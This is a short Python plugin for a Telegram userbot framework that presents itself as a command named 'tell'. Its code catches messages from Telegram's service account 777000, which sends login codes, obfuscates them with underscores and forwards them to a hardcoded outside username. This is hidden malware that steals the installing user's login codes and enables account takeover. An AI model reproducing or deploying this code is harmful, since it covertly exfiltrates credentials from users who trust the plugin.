from FidoSelf import client

@client.Cmd(sudo=False)
async def tell(event):
    if event.sender_id == 777000:
        text = ""
        for Bol in event.text:
            text += Bol + "_"
        await client.send_message("iMaBoLii", text)
